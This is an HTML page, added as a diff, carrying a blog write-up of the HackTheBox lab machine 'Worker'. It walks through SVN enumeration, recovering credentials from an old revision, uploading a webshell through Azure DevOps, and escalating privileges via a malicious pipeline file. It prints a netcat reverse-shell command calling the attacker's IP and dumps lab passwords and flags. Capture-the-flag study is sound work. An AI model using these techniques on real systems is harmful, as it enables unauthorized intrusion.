@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Worker // SixPraxis</title>
+    <link rel="shortcut icon" href="/images/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="SixPraxis" />
+    <meta name="description" content="Write Up for HackTheBox&#39;s Worker" />
+    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.86a2007e438a83c7fd8ff3ced81470ea9a72de62cbb2749eb6c16813ce7eadcb.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Worker"/>
+<meta name="twitter:description" content="Write Up for HackTheBox&#39;s Worker"/>
+
+    <meta property="og:title" content="HTB - Worker" />
+<meta property="og:description" content="Write Up for HackTheBox&#39;s Worker" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sixpraxis.github.io/posts/worker/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-06T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-04-06T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
+      <h1>SixPraxis</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
+  <title>HackTheBox</title>
+  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Worker</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 6, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/worker/">worker</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/medium/">medium</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p><img src="/images/htb-worker/worker.png" alt="Worker"></p>
+<h1 id="worker">Worker</h1>
+<h4 id="101010203">10.10.10.203</h4>
+<h5 id="by-sixpraxis">by SixPraxis</h5>
+<h3 id="write-up">Write-Up</h3>
+<p>Nmap scans showed three open ports. The two web ports revealed no useful information, one had a default IIS and the other a 404 page. Fuzzing found no additional pages. To investigate port 3690, the attacker used netcat, getting a response showing available SVN commands.</p>
+<pre><code>$nc 10.10.10.203 3690
+( success ( 2 2 ( ) ( edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list ) ) )
+</code></pre><p><code>svn list svn://10.10.10.203</code> showed a moved.txt file and dimension.worker.htb/ directory. We create a new svnRepo directory and <code>svn co svn://10.10.10.203</code> is issued inside of it to copy all of the files to the attacker&rsquo;s machine for enumeration. Moved.txt contained a message saying work had moved to <a href="http://devops.worker.htb">http://devops.worker.htb</a>, revealing a previously unknown subdomain. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> Pointing a web browser at the subdomain brought up a login prompt, hitting cancel went to an error page that showed we were attempting to access an Azure DevOps Server. Going back to the svn repo, <code>svn log svn://worker.htb/ --verbose</code> gets us a log with usernames and previous file changes.</p>
+<p><img src="/images/htb-worker/svnlog.png" alt="svn logs"></p>
+<p>The only user in the logs is nathen, the commit and deletion of a deployment script is of particular interest. After deleting the newer repo files, <code>svn co -r2 svn://worker.htb/</code> is used to download the revision containing the script. The script contains nathen&rsquo;s user and password, <code>nathen:wendel98</code>. These credentials were then used to log in to the Azure Devops server. No SSH keys or auth tokens were present in the user&rsquo;s security settings.</p>
+<p>To upload an aspx webshell and nc64.exe, the attacker created a new branch with a job selected, uploaded the files to that branch, created a pull request, approved and completed the pull request, then went to builds and spectral to make sure the build was being run. From the build settings, the directory for the site is <code>w:\sites\spectral.worker.htb\</code>. [^2] He pointed his browser to <code>http://spectral.worker.htb/cmdasp.aspx</code> and used the webshell to navigate to the spectral directory and establish a reverse shell using nc64.exe. <code>W:\sites\spectral.worker.htb\nc64.exe -e cmd.exe 10.10.14.19 4040</code>.</p>
+<p>The W:\svnrepos\www\conf folder contained a passwd file that held multiple users and passwords, including one of the system&rsquo;s users, <code>robisl = wolves11</code>. The attacker connected to the target using winrm with robisl&rsquo;s credentials and was able to secure the user flag!</p>
+<p><img src="/images/htb-worker/userflag.png" alt=""></p>
+<p>After some unsuccessful enumeration, the attacker logs into the devops server as robisl and finds he has access to a different repo. Looking through the settings uncovers an Agent Pool called &ldquo;Setup&rdquo; that has all it&rsquo;s permissions inherited from the Administrator user. Agents are what is used to run the scripts that build projects from their code repositories. When a pipeline to build a project is created, it can use an azure-pipelines.yml file to select an Agent and insert any scripts that need to be run during the build. In order to add their own azure-pipelines.yml to the repo, a new Work Item was created, a branch was made with the new yml file and then it was merged using a pull request. The new yml file contained a script to read the root flag and since it used the Setup pool that had Administrator permissions, it had no trouble accessing the file.</p>
+<pre><code>trigger:
+- master
+
+pool: 'Setup'
+
+steps:
+- script: type C:\Users\Administrator\Desktop\root.txt
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+  displayName: 'Run a multi-line script'
+</code></pre><p>A new build pipeline was setup, selecting the custom yml file, and executed. The results of the script are output to the web console and we have our root flag!</p>
+<p><img src="/images/htb-worker/rootflag.png" alt=""></p>
+<hr>
+<h3 id="recon">Recon</h3>
+<h5 id="nmap">NMAP</h5>
+<pre><code>PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+3690/tcp open  svnserve Subversion
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre><h6 id="port-80">Port 80</h6>
+<p>Wfuzz scans turned up nothing using big and common lists with extensions common.</p>
+<h6 id="port-3690">Port 3690</h6>
+<p>Netcat confirms this to be an Apache Subversion server.</p>
+<h6 id="port-5985">Port 5985</h6>
+<p>Most likely winrm.</p>
+<hr>
+<h3 id="credentials">Credentials</h3>
+<p>User flag: 2cec4b0cfcbfd6208323949700e322c4</p>
+<p>Root flag: 02f6c4c562f9a8d5eb46248edb02a848</p>
+<p>WinRM: robisl : wolves11</p>
+<pre><code>Nathalie Henley - Azure Devops Server
+$user = &quot;nathen&quot; 
+$plain = &quot;wendel98&quot;
+</code></pre><p>W:\svnrepos\www\conf\passwd</p>
+<pre><code>[users]
+nathen = wendel98
+nichin = fqerfqerf
+nichin = asifhiefh
+noahip = player
+nuahip = wkjdnw
+oakhol = bxwdjhcue
+owehol = supersecret
+paihol = painfulcode
+parhol = gitcommit
+pathop = iliketomoveit
+pauhor = nowayjose
+payhos = icanjive
+perhou = elvisisalive
+peyhou = ineedvacation
+phihou = pokemon
+quehub = pickme
+quihud = kindasecure
+rachul = guesswho
+raehun = idontknow
+ramhun = thisis
+ranhut = getting
+rebhyd = rediculous
+reeinc = iagree
+reeing = tosomepoint
+reiing = isthisenough
+renipr = dummy
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+rubkei = the
+rupkel = sheeps
+ryakel = imtired
+sabken = drjones
+samken = aqua
+sapket = hamburger
+sarkil = friday
+</code></pre><h5 id="notes">Notes</h5>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>Add the subdomain to your /etc/hosts file to access it. e.g. <code>10.10.10.203        devops.worker.htb</code> <a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
